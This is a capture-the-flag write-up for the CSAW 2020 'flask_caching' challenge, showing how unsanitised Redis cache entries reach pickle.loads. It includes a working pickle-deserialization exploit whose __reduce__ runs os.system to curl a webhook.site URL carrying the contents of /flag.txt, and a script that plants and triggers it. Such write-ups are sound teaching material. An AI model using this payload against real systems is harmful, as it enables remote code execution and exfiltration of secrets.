---
title: "CSAW Qualifiers 2020 - flask_caching"
date: 2020-09-14T21:15:03+01:00
---

We were presented with a simple Flask server,
we can see the code bellow (see the [full code](/ctf/csaw/qualifiers/app.py)).

```python
#!/usr/bin/env python3

from flask import Flask
from flask import request, redirect
from flask_caching import Cache
from redis import Redis
import jinja2
import os

app = Flask(__name__)
app.config['CACHE_REDIS_HOST'] = 'localhost'
app.config['DEBUG'] = False

cache = Cache(app, config={'CACHE_TYPE': 'redis'})
redis = Redis('localhost')
jinja_env = jinja2.Environment(autoescape=['html', 'xml'])


@app.route('/', methods=['GET', 'POST'])
def notes_post():
    if request.method == 'GET':
        return '''
        <h4>Post a note</h4>
        <form method=POST enctype=multipart/form-data>
        <input name=title placeholder=title>
        <input type=file name=content placeholder=content>
        <input type=submit>
        </form>
        '''

    print(request.form, flush=True)
    print(request.files, flush=True)
    title = request.form.get('title', default=None)
    content = request.files.get('content', default=None)

    if title is None or content is None:
        return 'Missing fields', 400

    content = content.stream.read()

    if len(title) > 100 or len(content) > 256:
        return 'Too long', 400

    redis.setex(name=title, value=content, time=10)  # Note will only live for max 30 seconds

    return 'Thanks!'


# This caching stuff is cool! Lets make a bunch of cached functions.

@cache.cached(timeout=10)
def _test0():
    return 'test'
@app.route('/test0')
def test0():
    _test0()
    return 'test'

if __name__ == "__main__":
    app.run('0.0.0.0', 5000)
```

Analyzing the code, top to bottom we see that the server uses Redis as a cache, no big deal with that.
However, the way it is being used is weird.

Whenever a new note is being posted,
the "raw" operation is used,
however when using the test endpoints the calls are wrapped with the `@cache.cached` decorator.

Furthermore, the test endpoints always return `'test'` so even if we store something there we will not have direct feedback.

Following the decorator rabbit hole to the [`rediscache.py`](https://github.com/sh4nks/flask-caching/blob/9bd8365aa5bac9fb91e9e7ddc663ff087a97ab7a/flask_caching/backends/rediscache.py#L112-L115) we find the following:

```python
def get(self, key):
    return self.load_object(
        self._read_clients.get(self._get_prefix() + key)
    )
```

And following the `load_object`:

```python
def load_object(self, value):
    """The reversal of :meth:`dump_object`.  This might be called with
    None.
    """
    if value is None:
        return None
    if value.startswith(b"!"):
        try:
            return pickle.loads(value[1:])
        except pickle.PickleError:
            return None
    try:
        return int(value)
    except ValueError:
        # before 0.8 we did not have serialization.  Still support that.
        return value
```

Seeing `pickle.loads` means we have a winner.

According to the [documentation](https://docs.python.org/3/library/pickle.html):

> Warning
>
> The pickle module is not secure. Only unpickle data you trust.
>
> It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

Triggering the deserialization is easy,
just start the content with `!` and the cache will take care of the rest for use.

Now we just need to create a payload and find the cache key.

First, the cache key as it is the easiest part.

- Run `app.py` with a Redis instance (increase the cache timer if necessary).
- Send a GET request to one of the test endpoints.
- Use `redis-cli` to retrieve all stored keys with `redis-cli keys "*"`.
- You now know the key is `flask_cache_view//testN` where `N` is the test endpoint number.

We now move on to the pickle.

With a quick search we find that this is called pickle shellcode,
the idea is to serialize a pickle with executes code on deserialization.

I found [this GitHub gist](https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14) which shows a "framework" to write "bad" pickles.

From there we write our exploit class:

```python
class Exploit():
    def __reduce__(self):
        return (os.system, ('curl https://webhook.site/<id>?flag=`cat /flag.txt`', ))
```

This works because `pickle` allows objects to decide how to be pickled using the `__reduce__` method,
hence we return a tuple of a `callable` and its arguments.

Using `os.system` we can launch an arbitrary process,
I used `curl` to send a request to `webhook.site` with the flag as a query parameter.

Now we just [automate](/ctf/csaw/qualifiers/exploit.py) the whole process,
serializing the Exploit object to bytes,
send the bytes as a file and request the test endpoint.

```python
url = "http://web.chal.csaw.io:5000/"

class Exploit():
    def __reduce__(self):
        return (os.system, ('curl https://webhook.site/127d80d9-c737-44fe-95b3-c053849634a5?flag=`cat /flag.txt`', ))

bad_pickle = b"!" + pickle.dumps(Exploit())
requests.post(url,
    data={"title":"flask_cache_view//test0"},
    files={"content":bad_pickle})
requests.get(url + "/test0")
```